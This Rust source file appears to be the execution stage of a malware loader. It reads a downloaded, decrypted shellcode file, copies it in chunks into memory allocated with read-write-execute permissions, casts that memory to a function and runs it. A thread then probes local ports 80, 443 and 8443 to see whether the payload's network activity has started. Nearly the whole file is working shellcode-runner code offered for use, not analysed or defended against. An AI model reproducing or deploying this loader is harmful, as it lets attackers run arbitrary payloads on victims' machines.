use std::path::Path;
use anyhow::{bail, Context, Result};
#[cfg(windows)]
use std::net::{TcpStream, SocketAddr};
#[cfg(windows)]
use std::time::Duration;
#[cfg(windows)]
use std::thread;

#[cfg(windows)]
use std::ptr::{null_mut, copy_nonoverlapping};
#[cfg(windows)]
use winapi::um::{errhandlingapi::GetLastError, memoryapi::VirtualAlloc};

/// Defines the maximum size for each payload chunk
#[cfg(windows)]
const CHUNK_SIZE: usize = 256;

/// Structure to manage payload chunks in memory
#[cfg(windows)]
struct PayloadChunk {
    pub data: Vec<u8>,
}

/// Monitors local/common TCP connections on specified ports for debugging purposes
#[cfg(windows)]
fn monitor_ports() {
    // List of common ports and targets to test where the connection drops
    let targets = vec![
        ("127.0.0.1", 80),
        ("127.0.0.1", 443),
        ("127.0.0.1", 8443),
    ];

    crate::debug_log("[DEBUG MON] Starting post-execution connection monitoring...");

    // Brief delay to ensure the shellcode has started interacting with the network
    thread::sleep(Duration::from_secs(2));

    for (host, port) in targets {
        let address = format!("{}:{}", host, port);
        crate::debug_log(format!("[DEBUG MON] Testing connection to {}...", address));

        match TcpStream::connect_timeout(&address.parse::<SocketAddr>().unwrap(), Duration::from_secs(4)) {
            Ok(_) => {
                crate::debug_log(format!("[DEBUG MON] SUCCESS: Connection established with {}.", address));
            }
            Err(e) => {
                crate::debug_log(format!(
                    "[DEBUG MON] FAILURE: Could not connect to {}. Error: {}",
                    address, e
                ));
            }
        }
    }
    crate::debug_log("[DEBUG MON] Port monitoring completed.");
}

/// Executes the downloaded artifact by chunking it into memory and executing it.
pub fn execute_artifact(path: &Path) -> Result<()> {
    crate::debug_log(format!("Starting artifact execution at: {}", path.display()));

    // Read the raw bytes from the decrypted (.bin) file.
    let shellcode = std::fs::read(path)
        .with_context(|| format!("Failed to read artifact bytes from {}", path.display()))?;

    if shellcode.is_empty() {
        bail!("The downloaded artifact is empty.");
    }

    crate::debug_log(format!(
        "Loaded artifact successfully; {} bytes ready for chunking",
        shellcode.len()
    ));

    #[cfg(windows)]
    {
        crate::debug_log("Dividing shellcode into discrete chunks...");

        // Split the original shellcode vector into fixed-size chunks
        let mut chunks: Vec<PayloadChunk> = Vec::new();
        for slice in shellcode.chunks(CHUNK_SIZE) {
            chunks.push(PayloadChunk {
                data: slice.to_vec(),
            });
        }

        crate::debug_log(format!("Total chunks created: {}", chunks.len()));

        unsafe {
            // Allocate memory with Read, Write, and Execute permissions (PAGE_EXECUTE_READWRITE)
            let mem = VirtualAlloc(
                null_mut(),
                shellcode.len(),
                0x1000, // MEM_COMMIT
                0x40,   // PAGE_EXECUTE_READWRITE
            );

            if mem.is_null() {
                let err = GetLastError();
                bail!("VirtualAlloc failed with OS error: {}", err);
            }

            crate::debug_log(format!(
                "Executable memory allocated successfully at {:?}",
                mem
            ));

            // Write each chunk sequentially into the allocated memory using calculated offsets
            let mut current_offset = 0;
            for (index, chunk) in chunks.iter().enumerate() {
                let chunk_len = chunk.data.len();
                let dest_ptr = (mem as *mut u8).add(current_offset);

                // Copy the current chunk safely into non-overlapping memory
                copy_nonoverlapping(chunk.data.as_ptr(), dest_ptr, chunk_len);

                crate::debug_log(format!(
                    "Chunk {}/{} written ({} bytes) at offset {}",
                    index + 1, chunks.len(), chunk_len, current_offset
                ));

                current_offset += chunk_len;
            }

            crate::debug_log("All payload chunks consolidated in memory successfully.");

            crate::debug_log("Starting post-execution port monitor thread.");
            let monitor_handle = thread::spawn(|| {
                monitor_ports();
            });

            // Transmute the base memory pointer into an executable Rust function
            let shellcode_runner: fn() = std::mem::transmute(mem);

            crate::debug_log("Jumping to the entry point of the chunked memory allocation...");
            shellcode_runner();
            crate::debug_log("Shellcode execution routine returned control.");

            if monitor_handle.join().is_err() {
                crate::debug_log("Port monitor thread panicked.");
            }

            crate::debug_log("Artifact execution completed.");
        }

        Ok(())
    }

    #[cfg(not(windows))]
    {
        bail!("Raw shellcode execution via chunk allocation is not implemented for non-Windows systems.");
    }
}
